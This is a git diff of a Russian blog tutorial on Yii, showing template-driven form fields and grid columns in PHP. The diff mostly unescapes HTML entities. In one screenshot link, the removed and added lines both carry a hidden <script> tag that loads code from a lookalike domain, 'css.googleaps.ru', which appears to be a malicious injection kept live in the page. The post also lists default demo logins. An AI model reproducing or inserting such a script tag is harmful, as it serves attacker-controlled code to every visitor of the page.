@@ -32,44 +32,44 @@ tags:
 - orm
 comments: []
 ---
-<div dir="ltr" style="text-align: left;">Вот я подготовил начальный проектик <a href="https:&#47;&#47;github.com&#47;des1roer&#47;yii_heart" target="_blank">ссылка <&#47;a><br />
-Делал на <a href="http:&#47;&#47;des1roer.blogspot.ru&#47;2015&#47;04&#47;yiiboster-31-yiiheart-12.html" target="_blank">основании <&#47;a><br />
+<div dir="ltr" style="text-align: left;">Вот я подготовил начальный проектик <a href="https://github.com/des1roer/yii_heart" target="_blank">ссылка </a><br />
+Делал на <a href="http://des1roer.blogspot.ru/2015/04/yiiboster-31-yiiheart-12.html" target="_blank">основании </a><br />
 Вход adminadmin gii - rootБаза - mysql localhost:locadb<br />
 Вид минимальной базы под действия</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-Nvt19_rIAHE&#47;VXgQjHOFfGI&#47;AAAAAAAAAcY&#47;BxblGHU0p4w&#47;s1600&#47;Screenshot_5.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-Nvt19_rIAHE&#47;VXgQjHOFfGI&#47;AAAAAAAAAcY&#47;BxblGHU0p4w&#47;s640&#47;Screenshot_5.png" alt="" width="640" height="388" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://2.bp.blogspot.com/-Nvt19_rIAHE/VXgQjHOFfGI/AAAAAAAAAcY/BxblGHU0p4w/s1600/Screenshot_5.png"><img src="http://2.bp.blogspot.com/-Nvt19_rIAHE/VXgQjHOFfGI/AAAAAAAAAcY/BxblGHU0p4w/s640/Screenshot_5.png" alt="" width="640" height="388" border="0" /></a></div><br />
 Что мы хотим получить</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-yAGxfY7Bky0&#47;VXgTMhjKbRI&#47;AAAAAAAAAck&#47;aEQS7cjfiu4&#47;s1600&#47;Screenshot_6.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-yAGxfY7Bky0&#47;VXgTMhjKbRI&#47;AAAAAAAAAck&#47;aEQS7cjfiu4&#47;s1600&#47;Screenshot_6.png" alt="" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://4.bp.blogspot.com/-yAGxfY7Bky0/VXgTMhjKbRI/AAAAAAAAAck/aEQS7cjfiu4/s1600/Screenshot_6.png"><img src="http://4.bp.blogspot.com/-yAGxfY7Bky0/VXgTMhjKbRI/AAAAAAAAAck/aEQS7cjfiu4/s1600/Screenshot_6.png" alt="" border="0" /></a></div><br />
 то есть в зависимости от шаблона (таблица template) мы отображаем разные столбцы (из таблицы element берем имена, из таблицы analiz_has_element значения)</p>
-<p>создаем базу https:&#47;&#47;github.com&#47;des1roer&#47;yii_heart&#47;blob&#47;master&#47;basesql.sql</p>
+<p>создаем базу https://github.com/des1roer/yii_heart/blob/master/basesql.sql</p>
 <p>создаем модели и CRUD под все таблицы (под template_has_elem crud можно не создавать).</p>
 <p>тогда в</p>
 <ul>
-<li>...yiiHeartprotectedextensionsheartviewslayouts_menu.php<&#47;li><br />
-<&#47;ul><br />
+<li>...yiiHeartprotectedextensionsheartviewslayouts_menu.php</li><br />
+</ul><br />
 можем добавить</p>
 <pre><code>    array('label' => 'Проект',<br />
     'url' => '#',<br />
     'icon' => 'fa fa-sitemap',</p>
 <p>    'items' => array(<br />
    array('label' => 'template',<br />
-    'url' => array('&#47;template'),<br />
+    'url' => array('/template'),<br />
     'icon' => 'fa fa-info'),<br />
     array('label' => 'analiz',<br />
-    'url' => array('&#47;analiz'),<br />
+    'url' => array('/analiz'),<br />
     'icon' => 'fa fa-info'),<br />
     array('label' => 'element',<br />
-    'url' => array('&#47;element'),<br />
+    'url' => array('/element'),<br />
     'icon' => 'fa fa-info', ),<br />
     array('label' => 'has_element',<br />
-    'url' => array('&#47;haselement'),<br />
+    'url' => array('/haselement'),<br />
     'icon' => 'fa fa-info'),<br />
     array('label' => 'template_has',<br />
-    'url' => array('&#47;templatehas'),<br />
+    'url' => array('/templatehas'),<br />
     'icon' => 'fa fa-info')</p>
 <p>)),<br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 получаем</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-S_WN-ChGQO8&#47;VXgcMtEflqI&#47;AAAAAAAAAc0&#47;9nV2l8vIyYQ&#47;s1600&#47;Screenshot_7.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-S_WN-ChGQO8&#47;VXgcMtEflqI&#47;AAAAAAAAAc0&#47;9nV2l8vIyYQ&#47;s640&#47;Screenshot_7.png" alt="" width="640" height="244" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://2.bp.blogspot.com/-S_WN-ChGQO8/VXgcMtEflqI/AAAAAAAAAc0/9nV2l8vIyYQ/s1600/Screenshot_7.png"><img src="http://2.bp.blogspot.com/-S_WN-ChGQO8/VXgcMtEflqI/AAAAAAAAAc0/9nV2l8vIyYQ/s640/Screenshot_7.png" alt="" width="640" height="244" border="0" /></a></div><br />
 выводим все элементы в ...yiiHeartprotectedviewstemplate_form.php</p>
 <pre><code>findAll(), 'id', 'name');</p>
 <p>if (isset($model->id))<br />
@@ -85,19 +85,19 @@ comments: []
 }<br />
 else<br />
     $arr_bit = array();</p>
-<p>&#47;&#47; $data = CHtml::textField('textField');<br />
+<p>// $data = CHtml::textField('textField');<br />
 echo CHtml::checkBoxList('im_id2', $arr_bit, $type_list, array(<br />
     'template' => "{input} {labelTitle}",<br />
     'class' => 'chclass',<br />
     'labelOptions'=>array('style'=>'display:inline'),<br />
         )<br />
 );<br />
-&#47;&#47;просто рисуем чекбокслитс из базы<br />
-&#47;&#47;данные для элементов<br />
-?>  <&#47;code><&#47;pre><br />
+//просто рисуем чекбокслитс из базы<br />
+//данные для элементов<br />
+?>  </code></pre><br />
 -<br />
 получаем</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-jO41aCWglSI&#47;VXggTU8e_FI&#47;AAAAAAAAAdA&#47;tf6w2cDKEJ4&#47;s1600&#47;Screenshot_8.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-jO41aCWglSI&#47;VXggTU8e_FI&#47;AAAAAAAAAdA&#47;tf6w2cDKEJ4&#47;s320&#47;Screenshot_8.png" alt="" width="276" height="320" border="0" &#47;><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://4.bp.blogspot.com/-jO41aCWglSI/VXggTU8e_FI/AAAAAAAAAdA/tf6w2cDKEJ4/s1600/Screenshot_8.png"><img src="http://4.bp.blogspot.com/-jO41aCWglSI/VXggTU8e_FI/AAAAAAAAAdA/tf6w2cDKEJ4/s320/Screenshot_8.png" alt="" width="276" height="320" border="0" /><script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></a></div><br />
 в контролере прописываем<br />
 при создании</p>
 <pre><code><br />
@@ -115,11 +115,11 @@ if (isset($_POST['im_id2']))<br />
     for($i = 0; $i < count($Ids); $i++)<br />
     {<br />
         $command->insert('template_has_element', array(<br />
-            'template_id' => $max, &#47;&#47;&#47;&#47;<br />
-            'element_id' => (int) $Ids[$i], &#47;&#47;&#47;&#47;<br />
+            'template_id' => $max, ////<br />
+            'element_id' => (int) $Ids[$i], ////<br />
         ));<br />
     }<br />
-};<&#47;code><&#47;pre><br />
+};</code></pre><br />
 при изменении</p>
 <pre><code><br />
 if (isset($_POST['im_id2']))<br />
@@ -133,18 +133,18 @@ if (isset($_POST['im_id2']))<br />
    for($i = 0; $i < count($Ids); $i++)<br />
    {<br />
        $command->insert('template_has_element', array(<br />
-           'template_id' => $model->id, &#47;&#47;&#47;&#47;<br />
-           'element_id' => (int) $Ids[$i], &#47;&#47;&#47;&#47;<br />
+           'template_id' => $model->id, ////<br />
+           'element_id' => (int) $Ids[$i], ////<br />
        ));<br />
    }<br />
 };<br />
-<&#47;code><&#47;pre><br />
-все как <a href="http:&#47;&#47;des1roer.blogspot.ru&#47;2015&#47;03&#47;yii-yii-for-dummies-chtmlcheckboxlist.html" target="_blank">здесь<&#47;a></p>
+</code></pre><br />
+все как <a href="http://des1roer.blogspot.ru/2015/03/yii-yii-for-dummies-chtmlcheckboxlist.html" target="_blank">здесь</a></p>
 <p>ввод анализа<br />
 в ...yiiHeartprotectedviewsanaliz_form.php<br />
 дописываем</p>
 <pre><code><br />
-&#47;&#47;добавление данных для ввода (при создании новой записи и отсутствии записи в изменяемой)<br />
+//добавление данных для ввода (при создании новой записи и отсутствии записи в изменяемой)<br />
 $id_template = $model->template_id;<br />
 if (isset($id_template))<br />
 {<br />
@@ -190,7 +190,7 @@ if (isset($id_template))<br />
         echo CHtml::textField("elem[$id][val]", '', array('id' => $rows[$i]['name']));<br />
     }<br />
 }<br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 таким образом в зависимости от шаблона у раз разное число полей для ввода.<br />
 тогда по аналогии в контроллере при создании</p>
 <pre><code><br />
@@ -202,25 +202,25 @@ if (isset($_POST['elem']))<br />
             ->from('analiz')<br />
             ->queryScalar();</p>
 <p>    $Ids = $_POST['elem'];<br />
-    &#47;&#47;echo '
+    //echo '
 <pre>
-<hr &#47;>';<br />
+<hr />';<br />
     $cnt = max(array_keys($Ids));<br />
     $min = min(array_keys($Ids));<br />
     for($i = $min; $i <= $cnt; $i++)<br />
     {<br />
         $val = $Ids[$i]['val'];<br />
-        &#47;&#47;echo $Ids[$i]['per'][0];<br />
+        //echo $Ids[$i]['per'][0];<br />
         if (isset($val) &amp;&amp; !empty($val))<br />
             $command->insert('analiz_has_element', array(<br />
-                'analiz_id' => $max, &#47;&#47;&#47;&#47;<br />
+                'analiz_id' => $max, ////<br />
                 'value' => $val,<br />
-                &#47;&#47; 'f_precision' =>  $Ids[$i]['per'][0],<br />
+                // 'f_precision' =>  $Ids[$i]['per'][0],<br />
                 'element_id' => $i<br />
             ));<br />
     }<br />
 };<br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 при обновлении</p>
 <pre><code><br />
 if (isset($_POST['elem']))<br />
@@ -228,7 +228,7 @@ if (isset($_POST['elem']))<br />
      $command = Yii::app()->db->createCommand();<br />
      $command->delete('analiz_has_element', 'analiz_id=:id', array(':id' => $model->id));<br />
      $Ids = $_POST['elem'];<br />
-     &#47;&#47;echo '<&#47;code><&#47;pre></p>
+     //echo '</code></pre></p>
 <pre>';<br />
      $cnt = max(array_keys($Ids));<br />
      $min = min(array_keys($Ids));<br />
@@ -237,15 +237,15 @@ if (isset($_POST['elem']))<br />
          $val = $Ids[$i]['val'];<br />
          if (isset($val) &amp;&amp; !empty($val))<br />
              $command->insert('analiz_has_element', array(<br />
-                 'analiz_id' => $model->id, &#47;&#47;&#47;&#47;<br />
+                 'analiz_id' => $model->id, ////<br />
                  'value' => $val,<br />
                  'element_id' => $i<br />
              ));<br />
      }<br />
- };<&#47;pre><br />
+ };</pre><br />
 &nbsp;</p>
-<pre><code><&#47;code><br />
-ну и отображение в ...yiiHeartprotectedviewsanalizadmin.php<&#47;pre></p>
+<pre><code></code><br />
+ну и отображение в ...yiiHeartprotectedviewsanalizadmin.php</pre></p>
 <pre><code><br />
 db->createCommand()<br />
             ->select('value')<br />
@@ -261,7 +261,7 @@ $myarray[] = array('header'=>'No','value'=>'($this->grid->dataProvider->paginati
     'htmlOptions' => array('style' =>'width: 25px; text-align:center;'),<br />
   );<br />
 $myarray[] =    array(<br />
-     &#47;&#47;     'header' => 'Name',<br />
+     //     'header' => 'Name',<br />
           'name'=> 'name',<br />
           'type'=>'raw',<br />
           'value' => '($data->name)',<br />
@@ -274,7 +274,7 @@ $myarray[] =    array(<br />
     )<br />
   );</p>
 <p>$template = 11;<br />
-&#47;&#47;находим все элементы из шаблона<br />
+//находим все элементы из шаблона<br />
 $connection = Yii::app()->db;<br />
 $sql = "<br />
         SELECT te.`element_id`,<br />
@@ -286,8 +286,8 @@ $sql = "<br />
                             ";<br />
 $dataReader = $connection->createCommand($sql)->query();<br />
 $rows = $dataReader->readAll();</p>
-<p>&#47;* -----------------Данные для таблицы------------------------------------------- *&#47;</p>
-<p>  for($i = 0, $cnt = count($rows); $i < $cnt; $i++) &#47;&#47;формируем столбцы<br />
+<p>/* -----------------Данные для таблицы------------------------------------------- */</p>
+<p>  for($i = 0, $cnt = count($rows); $i < $cnt; $i++) //формируем столбцы<br />
   {<br />
   $id = $rows[$i]['element_id'];<br />
   $myarray[] = array(<br />
@@ -319,11 +319,11 @@ $this->widget('bootstrap.widgets.TbGridView',array(<br />
  'id'=>'analiz-grid',<br />
  'dataProvider'=>$model->search(),<br />
  'filter'=>$model,<br />
- 'type' => 'striped hover', &#47;&#47;bordered condensed<br />
+ 'type' => 'striped hover', //bordered condensed<br />
  'columns'=>$myarray,<br />
 )); ?><br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 то есть в зависимости от шаблона выводим разное число столбцов. запросом узнаем их имена. и при формировании массива колонок запросом получаем данные в каждой ячейке.</p>
 <p>код наверно не идеальный, советы и замечания прошу оставлять в комментах. рабочий код лежит в проекте на гитхаб(ссылка самая первая)</p>
-<p><&#47;div><br />
+<p></div><br />
 Source: des1roer.blogspot.com</p>
